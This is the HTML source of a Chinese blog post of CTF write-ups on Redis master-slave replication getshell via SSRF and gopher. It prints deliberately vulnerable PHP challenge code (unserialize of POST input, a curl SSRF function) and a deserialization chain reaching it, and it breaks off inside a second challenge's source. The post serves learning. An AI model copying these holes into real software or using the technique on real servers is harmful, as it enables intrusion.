@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>redis数据库主从复制 - Gaorenyusi&#39;s Blog</title><meta name="Description" content="白茶清欢无别事，我在等风也等你"><meta property="og:url" content="http://localhost:1313/posts/rdis/">
+  <meta property="og:site_name" content="Gaorenyusi&#39;s Blog">
+  <meta property="og:title" content="redis数据库主从复制">
+  <meta property="og:description" content="白茶清欢无别事，我在等风也等你">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-03-09T19:28:01+00:00">
+    <meta property="article:modified_time" content="2024-03-09T19:28:01+00:00">
+    <meta property="article:tag" content="Redis">
+    <meta property="og:image" content="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/logo.webp">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/logo.webp">
+  <meta name="twitter:title" content="redis数据库主从复制">
+  <meta name="twitter:description" content="白茶清欢无别事，我在等风也等你">
+<meta name="application-name" content="gaorenyusi">
+<meta name="apple-mobile-web-app-title" content="gaorenyusi"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/logo.webp"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/posts/rdis/" /><link rel="prev" href="http://localhost:1313/posts/aliyunctf/" /><link rel="next" href="http://localhost:1313/posts/nodejs-vm/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "redis数据库主从复制",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/posts\/rdis\/"
+        },"image": ["https:\/\/gaorenyusi.oss-cn-chengdu.aliyuncs.com\/img\/logo.webp"],"genre": "posts","keywords": "redis","wordcount":  2739 ,
+        "url": "http:\/\/localhost:1313\/posts\/rdis\/","datePublished": "2024-03-09T19:28:01+00:00","dateModified": "2024-03-09T19:28:01+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "gaorenyusi","logo": "https:\/\/gaorenyusi.oss-cn-chengdu.aliyuncs.com\/img\/logo.webp"},"author": {
+                "@type": "Person",
+                "name": "gaorenyusi"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Gaorenyusi&#39;s Blog">Gaorenyusi&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> 主页 </a><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/links/" title="友链"> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Gaorenyusi&#39;s Blog">Gaorenyusi&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/" title="">主页</a><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/links/" title="友链">友链</a><a class="menu-item" href="/about/" title="">关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">redis数据库主从复制</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>gaorenyusi</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>漏洞学习</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-03-09">2024-03-09</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 2739 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 6 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#2023年春秋杯网络安全联赛冬季赛---ezezez_php">2023年春秋杯网络安全联赛冬季赛   ezezez_php</a></li>
+        <li><a href="#网鼎杯-2020-玄武组ssrfme"><strong>[网鼎杯 2020 玄武组]SSRFMe</strong></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="redis主从复制">redis主从复制</h1>
+<p><strong>1</strong>redis是什么参考：https://www.cnblogs.com/testfan2019/p/11008297.html</p>
+<p>一款内存高速缓存数据库，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://pic.imgdb.cn/item/65ec54b19f345e8d03c28fd5.jpg"
+        data-srcset="https://pic.imgdb.cn/item/65ec54b19f345e8d03c28fd5.jpg, https://pic.imgdb.cn/item/65ec54b19f345e8d03c28fd5.jpg 1.5x, https://pic.imgdb.cn/item/65ec54b19f345e8d03c28fd5.jpg 2x"
+        data-sizes="auto"
+        alt="https://pic.imgdb.cn/item/65ec54b19f345e8d03c28fd5.jpg"
+        title="https://pic.imgdb.cn/item/65ec54b19f345e8d03c28fd5.jpg" /></p>
+<p>最大的特点:快</p>
+<p><strong>2</strong>gopher协议是什么</p>
+<p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处</p>
+<p>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议</p>
+<p>Gopher协议格式：URL:gopher://<host>:<port>/<gopher-path>_后接TCP数据流</p>
+<p>其实感觉gopher协议就是可以发送数据流，在ssrf中这个协议类似可以传递数据命令。</p>
+<p><strong>3</strong>redis主从复制是什么</p>
+<p>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式</p>
+<p><strong>4</strong>为什么要用redis主从复制来getshell</p>
+<p><font color=red>随着现代的服务部署方式的不断发展，组件化成了不可逃避的大趋势，docker就是这股风潮下的产物之一，而在这种部署模式下，一个单一的容器中不会有除redis以外的任何服务存在，包括ssh和crontab，再加上权限的严格控制，只靠写文件就很难再getshell了，在这种情况下，我们就需要其他的利用手段了</font></p>
+<p>所以可见并不是想用，是redis的另外三种方法都不行了才用的。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://pic.imgdb.cn/item/65ec42979f345e8d037f8b10.png"
+        data-srcset="https://pic.imgdb.cn/item/65ec42979f345e8d037f8b10.png, https://pic.imgdb.cn/item/65ec42979f345e8d037f8b10.png 1.5x, https://pic.imgdb.cn/item/65ec42979f345e8d037f8b10.png 2x"
+        data-sizes="auto"
+        alt="https://pic.imgdb.cn/item/65ec42979f345e8d037f8b10.png"
+        title="https://pic.imgdb.cn/item/65ec42979f345e8d037f8b10.png" /></p>
+<p>slaveof后面跟的是主服务器ip</p>
+<h3 id="2023年春秋杯网络安全联赛冬季赛---ezezez_php">2023年春秋杯网络安全联赛冬季赛   ezezez_php</h3>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s2">&#34;function.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Rd</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$ending</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$cl</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$poc</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;All matters have concluded&#34;</span><span class="o">.</span><span class="s2">&#34;&lt;/br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$arg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$arg</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$arg</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">&#39;POC&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;0.o&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cl</span><span class="o">-&gt;</span><span class="na">var1</span> <span class="o">=</span> <span class="s2">&#34;get&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Poc</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$payload</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$fun</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__set</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">payload</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fun</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">getflag</span><span class="p">(</span><span class="nv">$paylaod</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Have you genuinely accomplished what you set out to do?&#34;</span><span class="o">.</span><span class="s2">&#34;&lt;/br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$paylaod</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Er</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$symbol</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">symbol</span> <span class="o">=</span> <span class="k">True</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__set</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>   
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#39;</span><span class="p">,</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Flag</span><span class="p">))){</span>
+</span></span><span class="line"><span class="cl">               <span class="nv">$value</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Flag</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;NoNoNo,please you can look hint.php&#34;</span><span class="o">.</span><span class="s2">&#34;&lt;/br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Ha</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$start</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$start1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$start2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">start1</span> <span class="o">.</span> <span class="s2">&#34;__construct&#34;</span> <span class="o">.</span> <span class="s2">&#34;&lt;/br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">start2</span> <span class="o">===</span> <span class="s2">&#34;o.0&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">start1</span><span class="o">-&gt;</span><span class="na">Love</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">start</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;You are Good!&#34;</span><span class="o">.</span><span class="s2">&#34;&lt;/br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">get</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$url</span><span class="o">=</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">var_dump</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$output</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$result_info</span> <span class="o">=</span> <span class="nx">curl_getinfo</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">var_dump</span><span class="p">(</span><span class="nv">$result_info</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">var_dump</span><span class="p">(</span><span class="nv">$output</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pop&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$a</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pop&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;You are Silly goose!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">You are Silly goose!
+</span></span></span></code></pre></div></div><p>看起来有很多的类，但有用的就几个，刚看这道题的时候还是很迷的，以为从Poc类下手利用file_get_contents，但看了师傅们的wp发现根本没用，而且<font color=red>Have you genuinely accomplished what you set out to do?</font>似乎也提示了。</p>
+<p>这里的结尾是函数get，典型的ssrf，然后可以看到在Re类有把get赋值给变量，而给不存在的变量赋值可以触发set魔术方法，两个set，第一个完全是迷惑，第二个set是正确的。触发后，赋的值就是$vaule的值，所以直接就调用get方法了，那么怎么触发call呢？把对象当作函数，可以看到Ha类</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">start1</span><span class="o">-&gt;</span><span class="na">Love</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">start</span><span class="p">);</span></span></span></code></pre></div></div><p>所以这里就是开始，链子</p>
+<p>Ha::__destruct -&gt; Rd::__call -&gt; Er::__set -&gt; get</p>
+<p>exp</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://pic.imgdb.cn/item/65ec51b29f345e8d03b68514.jpg"
+        data-srcset="https://pic.imgdb.cn/item/65ec51b29f345e8d03b68514.jpg, https://pic.imgdb.cn/item/65ec51b29f345e8d03b68514.jpg 1.5x, https://pic.imgdb.cn/item/65ec51b29f345e8d03b68514.jpg 2x"
+        data-sizes="auto"
+        alt="https://pic.imgdb.cn/item/65ec51b29f345e8d03b68514.jpg"
+        title="https://pic.imgdb.cn/item/65ec51b29f345e8d03b68514.jpg" /></p>
+<p>成功打到了get方法</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://pic.imgdb.cn/item/65ec51da9f345e8d03b72222.jpg"
+        data-srcset="https://pic.imgdb.cn/item/65ec51da9f345e8d03b72222.jpg, https://pic.imgdb.cn/item/65ec51da9f345e8d03b72222.jpg 1.5x, https://pic.imgdb.cn/item/65ec51da9f345e8d03b72222.jpg 2x"
+        data-sizes="auto"
+        alt="https://pic.imgdb.cn/item/65ec51da9f345e8d03b72222.jpg"
+        title="https://pic.imgdb.cn/item/65ec51da9f345e8d03b72222.jpg" /></p>
+<p>可惜没环境了，最后的重点redis主从复制没办法复现。</p>
+<p>参考：https://blog.csdn.net/mochu7777777/article/details/135760457</p>
+<h3 id="网鼎杯-2020-玄武组ssrfme"><strong>[网鼎杯 2020 玄武组]SSRFMe</strong></h3>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">check_inner_ip</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$match_result</span><span class="o">=</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#39;</span><span class="p">,</span><span class="nv">$url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$match_result</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;url fomat error&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$url_parse</span><span class="o">=</span><span class="nx">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">catch</span><span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;url fomat error&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$hostname</span><span class="o">=</span><span class="nv">$url_parse</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$ip</span><span class="o">=</span><span class="nx">gethostbyname</span><span class="p">(</span><span class="nv">$hostname</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$int_ip</span><span class="o">=</span><span class="nx">ip2long</span><span class="p">(</span><span class="nv">$ip</span><span class="p">);</span>
